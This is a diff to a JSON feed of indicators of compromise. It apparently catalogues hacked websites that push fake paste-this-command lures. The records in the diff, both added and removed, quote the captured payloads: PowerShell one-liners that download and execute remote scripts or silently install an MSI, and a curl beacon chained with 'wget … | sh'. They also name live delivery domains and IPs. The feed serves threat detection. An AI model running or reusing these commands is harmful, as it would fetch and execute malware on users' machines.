@@ -1,5 +1,69 @@
 [
   {
+    "UrlDomain": "www.mediweld.com",
+    "DeliveryUrl": [
+      "browse-cloud.codes"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "89.46.106.52"
+    ],
+    "Related": [
+      {
+        "Value": "https://browse-cloud.codes/5f16a861fec93d5c",
+        "Type": "payload download"
+      },
+      {
+        "Value": "https://browse-cloud.codes/api.php?s=a3946e3ded820e3d2f02885bf63c8a3a176d58bb9403b402&amp;_v=29910323",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "irm 'browse-cloud.codes/5f16a861fec93d5c'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-cloud.codes/5f16a861fec93d5c"
+    ],
+    "ReportId": "cmwfq2sdt0iq70omlfqlpffxx",
+    "ScannedAt": "2026-11-14T01:23:57.427000+00:00"
+  },
+  {
+    "UrlDomain": "kirketerpthaarup.dk",
+    "DeliveryUrl": [
+      "softsyncizobrazie.net"
+    ],
+    "PayloadUrl": [
+      "http://softsyncizobrazie.net/x"
+    ],
+    "IP": [
+      "46.30.213.96"
+    ],
+    "Related": [],
+    "Payload": "$f=\"$env:TEMP\\$([guid]::NewGuid().ToString('N').Substring(0,10)).msi\";iwr \"http://softsyncizobrazie[.]net/x\" -OutFile $f -UseBasicParsing;cmd /c msiexec /i $f /qn;exit",
+    "ResolvedDownloadUrl": [
+      "http://softsyncizobrazie.net/x"
+    ],
+    "ReportId": "cmwfpywm20ikw0omloshmzs1c",
+    "ScannedAt": "2026-11-14T01:20:56.286000+00:00"
+  },
+  {
+    "UrlDomain": "20wawo30.com",
+    "DeliveryUrl": [
+      "github.pw"
+    ],
+    "PayloadUrl": [
+      "https://github.pw/Girya/1a887bc54c6d3982"
+    ],
+    "IP": [
+      "153.127.54.82"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://github[.]pw/Girya/1a887bc54c6d3982')|iex",
+    "ResolvedDownloadUrl": [
+      "https://github.pw/Girya/1a887bc54c6d3982"
+    ],
+    "ReportId": "cmwfpwgss0ihy0omlygayvwid",
+    "ScannedAt": "2026-11-14T01:19:02.441000+00:00"
+  },
+  {
     "UrlDomain": "update.sportela.bg",
     "DeliveryUrl": [],
     "PayloadUrl": [],
@@ -5444,65 +5508,5 @@
     ],
     "ReportId": "cmwbg1jw206qq0nmlz0huek8f",
     "ScannedAt": "2026-11-11T01:31:58.863000+00:00"
-  },
-  {
-    "UrlDomain": "safeskill.co.za",
-    "DeliveryUrl": [
-      "browse-nnccodes.beer"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "197.242.65.12"
-    ],
-    "Related": [
-      {
-        "Value": "https://browse-nnccodes.beer/d6635ac514ec3dc5",
-        "Type": "payload download"
-      },
-      {
-        "Value": "https://browse-nnccodes.beer/api.php?s=8402fb1338daab6a166e91aa8c92a20798acfa98fb75c5a2&amp;_v=29905997",
-        "Type": "Reference"
-      },
-      {
-        "Value": "https://browse-nnccodes.beer/api.php?s=8402fb1338daab6a166e91aa8c92a20798acfa98fb75c5a2&amp;_v=29905998",
-        "Type": "Reference"
-      }
-    ],
-    "Payload": "irm 'browse-nnccodes.beer/d6635ac514ec3dc5'|iex;",
-    "ResolvedDownloadUrl": [
-      "https://browse-nnccodes.beer/d6635ac514ec3dc5"
-    ],
-    "ReportId": "cmwbfkpep06i70nml6przoq86",
-    "ScannedAt": "2026-11-11T01:18:52.837000+00:00"
-  },
-  {
-    "UrlDomain": "cofeservice.ru",
-    "DeliveryUrl": [
-      "browse-nnccodes.beer",
-      "script.google.com",
-      "script-six-tawny.vercel.app"
-    ],
-    "PayloadUrl": [
-      "https://script-six-tawny.vercel.app/lin",
-      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
-      "https://script-six-tawny.vercel.app/win",
-      "https://script-six-tawny.vercel.app/mac"
-    ],
-    "IP": [
-      "109.95.213.100"
-    ],
-    "Related": [
-      {
-        "Value": "https://silverrogpuia.pro/t.js?site=af886a10ae8d3e0eb720fa1e73cd1505",
-        "Type": "Reference"
-      }
-    ],
-    "Payload": "curl -sL -d \"id=e061325d-e3f5-4bf4-b562-31a09ea854b9&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fcofeservice[.]ru%2F&os=Linux%20x86_64&lastVisitAt=2026-11-11T01%3A00%3A40.345Z&lastShellAt=2026-11-11T01%3A00%3A40.345Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://script-six-tawny[.]vercel[.]app/lin' -L | sh",
-    "ResolvedDownloadUrl": [
-      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
-      "https://script-six-tawny.vercel.app/lin"
-    ],
-    "ReportId": "cmwbez2fg06ao0nmlov0j0g7o",
-    "ScannedAt": "2026-11-11T01:02:03.343000+00:00"
   }
 ]
